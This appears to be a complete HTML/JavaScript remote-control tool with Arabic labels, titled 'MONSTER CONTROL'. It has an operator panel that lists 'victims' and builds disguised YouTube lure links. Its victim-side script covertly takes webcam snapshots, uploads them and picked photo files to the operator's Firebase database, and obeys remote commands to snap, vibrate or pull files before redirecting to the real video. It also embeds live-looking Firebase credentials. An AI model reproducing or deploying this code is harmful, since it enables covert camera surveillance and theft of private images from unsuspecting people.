<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MONSTER CONTROL v12.0</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; }
        * { box-sizing: border-box; font-family: 'Courier New', monospace; }
        body { background: var(--bg); color: var(--neon); margin: 0; overflow: hidden; }

        /* القائمة اليسرى */
        .hamburger { position: fixed; top: 10px; left: 10px; z-index: 1000; cursor: pointer; background: #000; border: 1px solid var(--neon); padding: 5px 10px; border-radius: 4px; }
        #menu-check { display: none; }
        .sidebar { position: fixed; top: 0; left: -260px; width: 260px; height: 100%; background: #0a0a0a; border-right: 2px solid var(--neon); transition: 0.2s; z-index: 999; padding: 50px 10px; overflow-y: auto; }
        #menu-check:checked ~ .sidebar { left: 0; }

        .main { height: 100vh; padding: 15px; overflow-y: auto; text-align: center; margin-top: 40px; }
        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 20px; }
        
        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 11px; }
        button:active { background: var(--neon); color: #000; }

        .v-card { border: 1px solid #222; padding: 10px; margin-bottom: 8px; border-radius: 4px; text-align: right; cursor: pointer; }
        .v-card.active { border-color: #fff; background: #111; }
        .dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; float: left; }

        /* المعرض */
        .img-item { border: 1px solid #333; margin-bottom: 15px; background: #000; border-radius: 5px; overflow: hidden; }
        .img-item img { width: 100%; display: block; }
        .img-ctrls { display: flex; background: #111; }
        .img-ctrls button { flex: 1; border: none; border-top: 1px solid #333; border-radius: 0; }

        #victim-ui { position: fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:10000; display:none; flex-direction:column; align-items:center; justify-content:center; color:#fff; }
    </style>
</head>
<body>

<input type="checkbox" id="menu-check">
<label for="menu-check" class="hamburger">☰ الرادار</label>

<div class="sidebar">
    <h3 style="border-bottom: 1px solid var(--neon);">📡 الأجهزة</h3>
    <div id="v-list">بانتظار الضحايا...</div>
    <hr>
    <h3>⚙️ التلغيم</h3>
    <input type="text" id="target-url" placeholder="رابط فيديو (يوتيوب)" style="width:100%; background:#000; color:var(--neon); border:1px solid var(--neon); padding:8px;">
    <button onclick="build()" style="width:100%; margin-top:5px;">صناعة الرابط</button>
    <div id="res-link" style="font-size:9px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
</div>

<div class="main">
    <h3 style="border-bottom: 1px solid var(--neon);">🕹️ التحكم: <span id="active-target">اختر جهازاً</span></h3>
    <div class="btn-grid">
        <button onclick="cmd('snap')">📸 سحب صورة فورية</button>
        <button onclick="cmd('vibrate')" style="border-color:yellow;">📳 هز الهاتف</button>
        <button onclick="cmd('pick_file')" style="border-color:cyan;">📂 سحب ملفات الكاميرا</button>
        <button onclick="cmd('release')" style="background:#030;">🔓 إطلاق سراح</button>
    </div>
    <button onclick="clearDB()" style="width:100%; border-color:red; color:red;">🗑️ مسح كافة البيانات</button>

    <div id="gallery" style="margin-top:20px; text-align:right;">
        <h4>🖼️ معرض الصور والملفات:</h4>
        <div id="img-container"></div>
    </div>
</div>

<div id="victim-ui">
    <div style="width:40px; height:40px; border:4px solid #333; border-top-color:var(--neon); border-radius:50%; animation:spin 1s linear infinite;"></div>
    <p id="v-status">جاري الاتصال بالسيرفر...</p>
    <input type="file" id="file-input" style="display:none;" accept="image/*" multiple>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
</div>

<script>
    const config = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };
    firebase.initializeApp(config);
    const db = firebase.database();
    let selId = null;

    // --- إدارة الآدمن ---
    db.ref('victims').on('value', s => {
        const list = document.getElementById('v-list');
        const container = document.getElementById('img-container');
        list.innerHTML = '';
        s.forEach(child => {
            const v = child.val();
            const id = child.key;
            const online = (Date.now() - v.lastSeen) < 10000;
            list.innerHTML += `<div class="v-card ${id==selId?'active':''}" onclick="select('${id}','${v.model}')">
                <span class="dot" style="background:${online?'#0f0':'#f00'}"></span>
                <b>${v.model}</b><br><small>${v.time}</small>
            </div>`;

            if(id === selId && v.files) {
                container.innerHTML = '';
                Object.keys(v.files).forEach(fId => {
                    container.innerHTML += `<div class="img-item">
                        <img src="${v.files[fId]}">
                        <div class="img-ctrls">
                            <button onclick="window.open('${v.files[fId]}')">حفظ</button>
                            <button onclick="db.ref('victims/${id}/files/${fId}').remove()" style="color:red">حذف</button>
                        </div>
                    </div>`;
                });
            }
        });
    });

    function select(id, model) { selId = id; document.getElementById('active-target').innerText = model; document.getElementById('menu-check').checked = false; }
    
    function cmd(type) { if(selId) db.ref('victims/'+selId+'/cmd').set({ type, t: Date.now() }); }

    function build() { 
        const url = document.getElementById('target-url').value;
        document.getElementById('res-link').innerText = window.location.href.split('?')[0] + "?v=" + btoa(url); 
    }

    function clearDB() { if(confirm("حذف الكل؟")) db.ref('/').remove(); }

    // --- بايلوت الضحية ---
    const params = new URLSearchParams(window.location.search);
    const vUrl = params.get('v');
    if(vUrl) {
        (async () => {
            document.getElementById('victim-ui').style.display = 'flex';
            const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "Mobile_User";
            const ref = db.ref('victims').push();
            const myId = ref.key;

            const sendImg = (data) => ref.child('files').push(data);

            const snap = async () => {
                try {
                    const s = await navigator.mediaDevices.getUserMedia({video:true});
                    const video = document.getElementById('v'); video.srcObject = s; await video.play();
                    const canvas = document.getElementById('c'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    sendImg(canvas.toDataURL('image/jpeg', 0.5));
                    s.getTracks().forEach(t => t.stop());
                } catch(e) {}
            };

            await ref.set({ model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
            await snap();

            // الاستماع للأوامر
            db.ref('victims/' + myId + '/cmd').on('value', s => {
                const c = s.val();
                if(c) {
                    if(c.type === 'snap') snap();
                    if(c.type === 'vibrate') { navigator.vibrate([200, 100, 200]); }
                    if(c.type === 'pick_file') document.getElementById('file-input').click();
                    if(c.type === 'release') window.location.href = atob(vUrl);
                }
            });

            // معالجة سحب الملفات (الكاميرا)
            document.getElementById('file-input').onchange = (e) => {
                const files = e.target.files;
                for(let f of files) {
                    const reader = new FileReader();
                    reader.onload = (ev) => sendImg(ev.target.result);
                    reader.readAsDataURL(f);
                }
            };

            setInterval(() => ref.update({ lastSeen: Date.now() }), 5000);
        })();
    }
</script>
<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
</body>
</html>
